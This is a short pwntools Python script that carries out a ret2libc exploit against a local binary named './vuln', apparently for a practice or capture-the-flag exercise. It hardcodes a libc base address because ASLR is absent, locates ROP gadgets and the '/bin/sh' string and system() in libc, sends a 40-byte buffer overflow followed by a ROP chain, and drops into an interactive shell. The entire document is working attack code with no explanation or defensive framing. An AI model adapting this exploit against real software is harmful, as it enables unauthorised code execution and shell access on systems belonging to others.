#ret2libc DEP bypass, no ASLR

from pwn import *

#This is fixed because there is no ASLR
libc_base = 0x7ffff7d91000

name = "./vuln"
p = process(name)
elf = ELF(name)
rop = ROP(elf)


ret = rop.find_gadget(["ret"])
log.info("Found ret gadget: " + hex(ret.address))

poprdi = rop.find_gadget(["pop rdi", "ret"])
log.info("Found poprdi gadget: " +  hex(poprdi.address))

binsh_o = next(elf.libc.search("/bin/sh\x00".encode()))
binsh = libc_base + binsh_o
log.info("Found binsh in: " + hex(binsh))

system_o = elf.libc.symbols["system"]
system = libc_base + system_o
log.info("Found system in: "+ hex(system))

payload_base = "A"*40

payload = payload_base.encode()

payload += p64(ret.address) + p64(poprdi.address) + p64(binsh) + p64(system)

print(p.recvline())
print(p.recvline())

p.sendline(payload)
p.interactive()
